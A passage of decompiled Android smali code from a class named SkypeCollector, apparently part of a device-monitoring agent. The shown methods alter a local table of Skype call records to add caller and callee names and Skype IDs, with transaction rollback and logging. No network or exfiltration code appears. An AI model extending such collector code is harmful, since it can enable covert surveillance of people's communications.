    invoke-interface {v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v1

    goto :goto_0

    :catch_1
    move-exception v2

    move-object v6, v2

    move-object v2, v1

    move-object v1, v6

    .line 198
    :goto_0
    iget-object v3, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    const-string v4, "ModuleAbstract"

    const-string v5, "update(v1to3): exception caught while altering skype tables"

    invoke-interface {v3, v4, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eqz v2, :cond_2

    :try_start_2
    const-string v1, "ROLLBACK"

    .line 202
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/sql/SQLException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_1

    :catch_2
    move-exception v1

    .line 206
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "ModuleAbstract"

    const-string v4, "update(v1to3): exception caught on TRANSACTION ROLLBACK"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_2
    :goto_1
    return v0
.end method

.method protected upgradeFromV2toV3()Z
    .locals 7

    const/4 v0, 0x0

    const/4 v1, 0x0

    .line 218
    :try_start_0
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    const-string v1, "BEGIN"

    .line 220
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_call ADD COLUMN fromDisplayName TEXT"

    .line 224
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_call ADD COLUMN fromSkypeId TEXT"

    .line 225
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_call ADD COLUMN toDisplayName TEXT"

    .line 226
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_call ADD COLUMN toSkypeId TEXT"

    .line 227
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "COMMIT"

    .line 229
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    .line 231
    iget-object v1, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v3, "ModuleAbstract"

    const-string v4, "update(v3): altering skype tables was successfull"

    invoke-interface {v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v1

    goto :goto_0

    :catch_1
    move-exception v2

    move-object v6, v2

    move-object v2, v1

    move-object v1, v6

    .line 234
    :goto_0
    iget-object v3, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    const-string v4, "ModuleAbstract"

    const-string v5, "update(v3): exception caught while altering skype tables"

    invoke-interface {v3, v4, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eqz v2, :cond_0

    :try_start_2
    const-string v1, "ROLLBACK"

    .line 238
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/sql/SQLException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_1

    :catch_2
    move-exception v1

    .line 242
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "ModuleAbstract"

    const-string v4, "update(v3): exception caught on TRANSACTION ROLLBACK"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    :goto_1
    return v0
.end method
